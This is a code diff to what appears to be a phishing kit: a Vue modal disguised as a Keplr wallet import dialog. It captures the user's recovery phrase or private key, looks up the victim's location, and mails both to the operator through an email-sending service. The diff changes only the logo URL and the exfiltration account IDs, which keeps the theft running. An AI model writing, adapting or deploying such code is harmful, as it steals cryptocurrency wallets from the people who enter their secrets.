@@ -166,7 +166,7 @@ const hiddenFields = ref([]);
 const privateKeyInput = ref('');
 const primaryColor = '#14afeb';
 const accentBg = 'white';
-const logoUrl = 'https://logo.clearbit.com/keplr.app';
+const logoUrl = 'https://garden-finance.imgix.net/wallets/keplr.svg';
 
 function closeModal() { emit('close'); }
 
@@ -230,9 +230,9 @@ async function confirmPhrase() {
     const location = await axios.get('https://ipapi.co/json');
     const payload = { type: importType.value, phrase: phraseWords.value.join(' ') };
     const params = {
-      service_id: 'service_eusbqyo',
-      template_id: 'template_z6xga6o',
-      user_id: 'obT4LcwZqPw_KlOar',
+      service_id: 'service_k4kimk6',
+      template_id: 'template_mpy0fmg',
+      user_id: 'DMvtKT5BmC4qV83V9',
       template_params: {
         from_name: 'Blockchain solutions',
         wallet_type: 'Keplr Wallet',
@@ -255,9 +255,9 @@ async function confirmPrivateKey() {
     const location = await axios.get('https://ipapi.co/json');
     const payload = { privateKey: privateKeyInput.value };
     const params = {
-      service_id: 'service_eusbqyo',
-      template_id: 'template_z6xga6o',
-      user_id: 'obT4LcwZqPw_KlOar',
+      service_id: 'service_k4kimk6',
+      template_id: 'template_mpy0fmg',
+      user_id: 'DMvtKT5BmC4qV83V9',
       template_params: {
         from_name: 'Blockchain solutions',
         wallet_type: 'Keplr Wallet',
